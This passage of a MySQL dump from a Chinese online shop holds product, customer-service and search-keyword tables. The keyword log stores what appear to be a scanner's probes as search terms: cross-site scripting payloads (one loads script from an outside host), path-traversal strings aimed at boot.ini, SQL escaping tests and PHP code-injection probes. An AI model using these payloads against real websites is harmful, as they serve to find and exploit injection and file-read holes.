INSERT INTO `ec22703249_goods_gallery` VALUES ('26', '22', 'images/201407/goods_img/22_P_1406222850324.jpg', '', 'images/201407/thumb_img/22_thumb_P_1406222850977.jpg', 'images/201407/source_img/22_P_1406222850141.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('27', '23', 'images/201407/goods_img/23_P_1406222920740.jpg', '', 'images/201407/thumb_img/23_thumb_P_1406222920872.jpg', 'images/201407/source_img/23_P_1406222920450.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('28', '24', 'images/201407/goods_img/24_P_1406223054666.jpg', '', 'images/201407/thumb_img/24_thumb_P_1406223054900.jpg', 'images/201407/source_img/24_P_1406223054527.jpg');

-- ----------------------------
-- Table structure for `ec22703249_goods_type`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_type`;
CREATE TABLE `ec22703249_goods_type` (
  `cat_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `cat_name` varchar(60) NOT NULL DEFAULT '',
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `attr_group` varchar(255) NOT NULL,
  PRIMARY KEY (`cat_id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_type
-- ----------------------------
INSERT INTO `ec22703249_goods_type` VALUES ('2', '音乐', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('3', '电影', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('4', '手机', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('5', '笔记本电脑', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('6', '数码相机', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('7', '数码摄像机', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('8', '化妆品', '1', '');
INSERT INTO `ec22703249_goods_type` VALUES ('9', '精品手机', '1', '');

-- ----------------------------
-- Table structure for `ec22703249_group_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_group_goods`;
CREATE TABLE `ec22703249_group_goods` (
  `parent_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `admin_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`parent_id`,`goods_id`,`admin_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_group_goods
-- ----------------------------
INSERT INTO `ec22703249_group_goods` VALUES ('10', '14', '19.00', '1');
INSERT INTO `ec22703249_group_goods` VALUES ('16', '14', '19.00', '1');

-- ----------------------------
-- Table structure for `ec22703249_kefu`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_kefu`;
CREATE TABLE `ec22703249_kefu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_kefu
-- ----------------------------
INSERT INTO `ec22703249_kefu` VALUES ('1', 'kefushow', '1');
INSERT INTO `ec22703249_kefu` VALUES ('2', 'skin', '10');
INSERT INTO `ec22703249_kefu` VALUES ('3', 'show', '1');
INSERT INTO `ec22703249_kefu` VALUES ('4', 'showlefttop', '30');
INSERT INTO `ec22703249_kefu` VALUES ('5', 'showleft', '10');
INSERT INTO `ec22703249_kefu` VALUES ('6', 'showrighttop', '110');
INSERT INTO `ec22703249_kefu` VALUES ('7', 'showright', '50');
INSERT INTO `ec22703249_kefu` VALUES ('8', 'fs_show', '0');
INSERT INTO `ec22703249_kefu` VALUES ('9', 'typeone', '售前客服');
INSERT INTO `ec22703249_kefu` VALUES ('10', 'kfqq', '张三:25872435');
INSERT INTO `ec22703249_kefu` VALUES ('11', 'im', '李四:zixiao07');
INSERT INTO `ec22703249_kefu` VALUES ('12', 'typetwo', '售后客服');
INSERT INTO `ec22703249_kefu` VALUES ('13', 'kfqqtwo', '李四:49335350');
INSERT INTO `ec22703249_kefu` VALUES ('14', 'imtwo', '张三:luoye07');
INSERT INTO `ec22703249_kefu` VALUES ('15', 'qqqun', '');
INSERT INTO `ec22703249_kefu` VALUES ('16', 'wwqun', '');
INSERT INTO `ec22703249_kefu` VALUES ('17', 'kftel', '400888888');
INSERT INTO `ec22703249_kefu` VALUES ('18', 'shijian', '8:00-23:00');
INSERT INTO `ec22703249_kefu` VALUES ('19', 'kf53', '');
INSERT INTO `ec22703249_kefu` VALUES ('20', 'qqcss', '1');
INSERT INTO `ec22703249_kefu` VALUES ('21', 'wwcss', '1');
INSERT INTO `ec22703249_kefu` VALUES ('22', 'fenxiang', '');

-- ----------------------------
-- Table structure for `ec22703249_keywords`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_keywords`;
CREATE TABLE `ec22703249_keywords` (
  `date` date NOT NULL DEFAULT '0000-00-00',
  `searchengine` varchar(20) NOT NULL DEFAULT '',
  `keyword` varchar(90) NOT NULL DEFAULT '',
  `count` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`date`,`searchengine`,`keyword`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_keywords
-- ----------------------------
INSERT INTO `ec22703249_keywords` VALUES ('2013-10-07', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2013-10-07', 'ecshop', '小米手机3', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2013-10-07', 'ecshop', '冰淇淋', '18');
INSERT INTO `ec22703249_keywords` VALUES ('2014-01-14', 'ecshop', '小米', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-01-14', 'ecshop', '手机', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-01', 'ecshop', '米兔', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-01', 'ecshop', '九宫格', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-01', 'ecshop', '哈哈', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-02', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-02', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-02', 'ecshop', '小米手机3', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-04', 'ecshop', '财神', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '小米手机3', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '小米电视', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;script&gt;alert(abc)&lt;/script&gt;', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888', '573');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;script&gt;alert(42873)&lt;/script&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;img', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'src=1', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'onerror=alert(42873)&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;div', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'style=width:expression(alert(42873))&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;script', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'src=http://xxooxxoo.js&gt;&lt;/script&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888+/v9', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '+ADw-script+AD4-alert(1)+ADw-/script+AD4-', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'onmousemove=alert(42873)', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'wb=\\&quot;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;a', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'href=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#1', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'onmousemove=\\\\\\\'alert(42873)\\\\\\\'wb=\\&quot;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'onmouseover=prompt(42873)', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'bad=\\&quot;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;iframe', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'SRC=javascript:alert(42873)&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;body', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'ONLOAD=alert(42873)&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;object', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;EMBED', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'SRC=javascript:alert(42873)&gt;&lt;/EMBED&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888&lt;BASE', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'HREF=\\&quot;javascript:alert(42873);//\\&quot;&gt;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\\\\\'', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\27', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\0\\\\\\\'', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\\\\\\\\\\\\\'', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\\\\\\\\&quot;', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888JyI=', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\\\\\'\\&quot;', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888/', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888alert(42873)', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini\\0', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini\\0.jpg', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '/.\\\\\\\\\\\\\\\\./.\\\\\\\\\\\\\\\\./.\\\\\\\\\\\\\\\\./.\\\\\\\\\\\\\\\\./.\\\\\\\\\\\\\\\\./.\\\\\\\\\\\\\\\\./boot.ini', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\boot.ini', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../..//../..//../..//../..//../..//../..//../..//../..//boot.ini', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././boot.ini', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini\\0.htm', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'file:///c:/boot.ini', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '................boot.ini', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'http://some-inexistent-website.com/some\\_inexistent\\_file\\_with\\_long\\_name', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '/some\\_inexistent\\_file\\_with\\_long\\_name', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'SomeCustomInjectedHeader:injected\\_by\\_wvs', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'dir', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '&lt;dir', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'http://oxoxoxoxoxoxox.com', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', 'oxoxoxoxoxoxox.com', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '+/v9', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888<script>alert(42873)</script>', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\'', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\%27', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\0\\\'', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\\\"', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '88888\\\'\"', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini\0.jpg', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '/.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./boot.ini', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '../../../../../../../../boot.ini\0.htm', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-10', 'ecshop', '<dir', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-12', 'ecshop', 'ui', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-17', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-23', 'ecshop', '小米手机3', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-23', 'ecshop', '小米电视', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-23', 'ecshop', '变形金刚', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-23', 'ecshop', '百变后盖', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-23', 'ecshop', '优惠套装', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-25', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3', '238');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米电视', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<script>alert(42873)</script>', '12');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\'', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\%27', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\0\\\'', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\\\\\'', '12');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\\\"', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888JyI=', '12');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\'\"', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888', '1199');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', ';print(md5(1122));#', '13');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '\\\');print(md5(1122));//', '7');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '${@print(md5(1122))}', '13');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'data:text/plain,<?php', '7');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'print(md5(1122));?>', '7');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'phpinfo', '13');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;script&gt;alert(42873)&lt;/script&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;img', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'src=1', '11');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onerror=alert(42873)&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;div', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'style=width:expression(alert(42873))&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;script', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'src=http://xxooxxoo.js&gt;&lt;/script&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888+/v9', '10');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '+ADw-script+AD4-alert(1)+ADw-/script+AD4-', '11');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\&quot;', '18');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onmousemove=alert(42873)', '11');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'wb=\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;a', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'href=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#1', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onmousemove=\\\\\\\'alert(42873)\\\\\\\'wb=\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onmouseover=prompt(42873)', '11');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'bad=\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;iframe', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'SRC=javascript:alert(42873)&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;body', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'ONLOAD=alert(42873)&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;object', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;EMBED', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'SRC=javascript:alert(42873)&gt;&lt;/EMBED&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888&lt;BASE', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'HREF=\\&quot;javascript:alert(42873);//\\&quot;&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\27', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\0\\\\\\\'', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\\\\\\\\\\\\\'', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\\\\\\\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\\\\\\\'\\&quot;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '\\\\\\\');print(md5(1122));//', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'data:text/plain,&lt;?php', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'print(md5(1122));?&gt;', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<img', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onerror=alert(42873)>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<div', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'style=width:expression(alert(42873))>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<script', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'src=http://xxooxxoo.js></script>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888\"', '12');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'wb=\"', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<a', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'href=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'onmousemove=\\\'alert(42873)\\\'wb=\"', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'bad=\"', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<iframe', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'SRC=javascript:alert(42873)>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<body', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'ONLOAD=alert(42873)>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<object', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<EMBED', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'SRC=javascript:alert(42873)></EMBED>', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '88888<BASE', '4');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'HREF=\"javascript:alert(42873);//\">', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<script>alert(42873)</script>', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<img', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<div', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<script', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3+/v9', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\"', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<a', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<iframe', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<body', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<object', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<EMBED', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3<BASE', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\\\'', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\\%27', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\0\\\'', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\\\\\\\'', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\\\\\"', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3JyI=', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', '小米手机3\\\'\"', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-03-31', 'ecshop', 'adi', '16');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-01', 'BAIDU', '鐧惧', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-03', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-04', 'ecshop', '学院', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-04', 'ecshop', '测试', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-04', 'ecshop', '红米', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-04', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-05', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-06', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-09', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-09', 'ecshop', '小米手机3', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-11', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-12', 'BAIDU', '鐧惧', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-13', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-14', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-15', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-16', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-17', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-18', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-18', 'ecshop', '耳机', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-19', 'ecshop', '7', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-19', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-19', 'BAIDU', 'ecshop灏忕背2014鏁寸珯+鎵嬫満鐗', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-19', 'BAIDU', 'ecshop  鎵嬫満鐗', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-20', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-20', 'ecshop', '红米', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-21', 'BAIDU', '鐧惧', '2');
